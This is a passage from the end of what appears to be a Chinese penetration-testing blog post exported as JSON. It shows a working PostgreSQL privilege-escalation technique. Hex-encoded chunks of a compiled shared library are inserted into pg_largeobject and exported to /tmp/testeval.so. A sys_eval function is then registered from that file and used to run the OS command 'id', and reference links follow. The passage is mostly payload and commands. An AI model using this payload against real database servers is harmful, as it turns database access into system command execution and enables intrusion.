00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b00d000000000000700d0000000000000000000000000000101e20000000000001000000000000007c010000000000000c00000000000000580b0000000000000d000000000000006c110000000000001900000000000000f81d2000000000001b0000000000000008000000000000001a00000000000000001e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000005006000000000000060000000000000060020000000000000a00000000000000aa010000000000000b00000000000000180000000000000003000000000000000020200000000000020000000000000028020000000000001400000000000000070000000000000017000000000000003009000000000000070000000000000070080000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f000000005008000000000000ffffff6f000000000100000000000000f0ffff6f00000000fa07000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex'));insert into pg_largeobject values (9023, 4, decode('181e20000000000000000000000000000000000000000000960b000000000000a60b000000000000b60b000000000000c60b000000000000d60b000000000000e60b000000000000f60b000000000000060c000000000000160c000000000000260c000000000000360c000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c0000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31362900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000001e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000280000000b000000020000000000000060020000000000006002000000000000f0030000000000000400000002000000080000000000000018000000000000003000000003000000020000000000000050060000000000005006000000000000aa0100000000000000000000000000000100000000000000000000000000000038000000ffffff6f0200000000000000fa07000000000000fa07000000000000540000000000000003000000000000000200000000000000020000000000000045000000feffff6f02000000000000005008000000000000500800000000000020000000000000000400000001000000080000000000000000000000000000005400000004000000020000000000000070080000000000007008000000000000c0000000000000000300000000000000080000000000000018000000000000005e000000040000004200000000000000300900000000000030090000000000002802000000000000030000000a0000000800000000000000180000000000000068000000010000000600000000000000580b000000000000580b0000000000001a0000000000000000000000000000000400000000000000000000000000000063000000010000000600000000000000800b000000000000800b00000000000080010000000000000000000000000000100000000000000010000000000000006e000000010000000600000000000000000d000000000000000d0000000000006c04000000000000000000000000000010000000000000000000000000000000740000000100000006000000000000006c110000000000006c1100000000000009000000000000000000000000000000040000000000000000000000000000007a000000010000000200000000000000801100000000000080110000000000004c0000000000000000000000000000001000000000000000000000000000000082000000010000000200000000000000cc11000000000000cc110000000000006c00000000000000000000000000000004000000000000000000000000000000900000000100000002000000000000003812000000000000381200000000000014020000000000000000000000000000080000000000000000000000000000009a0000000e0000000300000000000000f81d200000000000f81d0000000000000800000000000000000000000000000008000000000000000000000000000000a60000000f0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000b2000000010000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000b7000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000c4000000060000000300000000000000181e200000000000181e000000000000c001000000000000040000000000000008000000000000001000000000000000cd000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d200000001000000030000000000000000202000000000000020000000000000d000000000000000000000000000000008000000000000000800000000000000db000000080000000300000000000000d020200000000000d0200000000000000800000000000000000000000000000001000000000000000000000000000000e00000000100000030000000000000000000000000000000', 'hex'));insert into pg_largeobject values (9023, 5, decode('d0200000000000002d00000000000000000000000000000001000000000000000100000000000000010000000300000000000000000000000000000000000000fd20000000000000e900000000000000000000000000000001000000000000000000000000000000', 'hex'));SELECT lo_export(9023, '/tmp/testeval.so');执行命令：CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/testeval.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;select sys_eval('id');drop function sys_eval; 0x04 参考资料http://www.91ri.org/6507.html http://static.hx99.net/static/drops/tips-6449.html http://www.voidcn.com/article/p-sunyuemo-nw.html https://www.jianshu.com/p/ba0297da2c2e http://www.postgres.cn/docs/9.4/catalog-pg-largeobject.html https://github.com/sqlmapproject/udfhack/","tags":[],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]}],"categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"渗透工具","slug":"渗透工具","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"},{"name":"环境搭建","slug":"环境搭建","permalink":"http://yoursite.com/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[]}